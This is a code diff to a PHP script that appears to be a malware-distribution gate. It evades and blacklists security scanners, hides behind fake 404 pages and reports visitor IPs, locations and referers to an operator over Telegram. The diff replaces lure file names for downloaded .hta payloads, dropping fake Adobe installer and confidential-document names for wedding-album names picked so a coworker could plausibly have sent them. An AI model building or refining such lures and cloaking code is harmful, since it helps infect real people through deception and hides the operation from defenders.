@@ -351,7 +351,7 @@ function flood_check(): void {
             tg("\xE2\x9A\xA0\xEF\xB8\x8F <b>Scanner flood detected</b>\n"
              . ($raw['n'] . " honeypot hits in 60s — a bot/scanner is enumerating the site.")
              . " Each hit 404s and its IP+UA is poisoned for 24h.\n"
-             . "IP: " . ip() . "\nUA: " . mb_substr(ua(), 0, 120));
+             . "IP: " . ip() . "\nUA: " . (function_exists('mb_substr') ? mb_substr(ua(), 0, 120) : substr(ua(), 0, 120)));
         }
     }
 }
@@ -425,31 +425,32 @@ function gate_dl(): array {
     return $tok;
 }
 
-// ------------------------------------------------- name generation
-// Mixed pool: fresh Adobe-setup names AND fresh document names per visit.
+// ------------------------------------------------------- name generation
+// Wedding-album name pool — generic and sender-agnostic (a coworker could
+// plausibly name their own album any of these). Fresh pick per visit.
 function make_name(): string {
-    $adobe = [
-        'Adobe_Acrobat_Pro_DC_'          . sprintf('%d.%d.%04d', random_int(23,25), random_int(1,9), random_int(1,9999)),
-        'Adobe_Creative_Cloud_Updater_'  . sprintf('%d.%d.%04d', random_int(3,7),  random_int(1,9), random_int(1,9999)),
-        'Adobe_Acrobat_Standard_DC_'     . sprintf('%d.%d.%04d', random_int(23,25), random_int(1,9), random_int(1,9999)),
-        'Adobe_DC_Reader_Patch_'         . sprintf('%d.%d.%04d', random_int(22,25), random_int(1,9), random_int(1,9999)),
-        'Adobe_Acrobat_Sign_'            . sprintf('%d.%d.%04d', random_int(2,5),  random_int(1,9), random_int(1,9999)),
-        'Adobe_Update_Package_'          . random_int(10000, 99999),
+    $a = [
+        'Our_Wedding_Album_'      . date('Y') . '_' . random_int(100, 999),
+        'Wedding_Photos_October'  . '_' . random_int(100, 999),
+        'Wedding_Day_Photos_'     . date('Y'),
+        'Our_Wedding_'            . date('Y') . '_Album',
+        'Wedding_Album_'          . random_int(1000, 9999),
+        'The_Big_Day_Photos_'     . random_int(100, 999),
     ];
-    $conf = [
-        'Confidential_Document_' . random_int(100000, 999999),
-        'Confidential_Record_'   . date('Ymd') . '_' . random_int(1000, 9999),
-        'Internal_Memo_'         . random_int(10000, 99999),
-        'Contract_Agreement_'    . random_int(100000, 999999),
-        'Document_File_'         . date('Ymd') . '_' . random_int(100, 999),
-        'Statement_Report_'      . date('Y') . '_' . random_int(1000, 9999),
+    $b = [
+        'Wedding_Photos_'         . date('Ymd') . '_' . random_int(100, 999),
+        'Just_Married_Album_'     . random_int(1000, 9999),
+        'Ceremony_Photos_'        . date('Y') . '_' . random_int(100, 999),
+        'Reception_Photos_'       . random_int(100, 999),
+        'Our_Day_Photos_'         . date('Y'),
+        'Wedding_Memories_'       . random_int(10000, 99999),
     ];
-    $pool = random_int(0, 1) ? $conf : $adobe;   // 50/50 mix
+    $pool = random_int(0, 1) ? $a : $b;
     return $pool[random_int(0, count($pool)-1)] . '.hta';
 }
 
 function name_kind(string $name): string {
-    return preg_match('/^adobe/i', $name) ? 'adobe' : 'document';
+    return 'album';
 }
 
 // ------------------------------------------------------- telegram
@@ -502,12 +503,12 @@ function forensics_404(): void {
         '🔍 404-gate: possible human blocked',
         '📍 ' . ip() . ' — ' . $g['city'] . ', ' . $g['country'] . ' (' . $g['isp'] . ')',
         '📄 ' . (string)($_SERVER['REQUEST_URI'] ?? ''),
-        '🖥 ' . mb_substr($ua, 0, 120),
+        '🖥 ' . (function_exists('mb_substr') ? mb_substr($ua, 0, 120) : substr($ua, 0, 120)),
     ];
     if (req_header('Referer') !== '') {
-        $lines[] = '🔗 ' . mb_substr(req_header('Referer'), 0, 120);
+        $lines[] = '🔗 ' . (function_exists('mb_substr') ? mb_substr(req_header('Referer'), 0, 120) : substr((string)req_header('Referer'), 0, 120));
     }
-    tg(mb_substr(implode("\n", $lines), 0, 2900));
+    tg(function_exists('mb_substr') ? mb_substr(implode("\n", $lines), 0, 2900) : substr(implode("\n", $lines), 0, 2900));
 }
 
 function silent_404(): void {
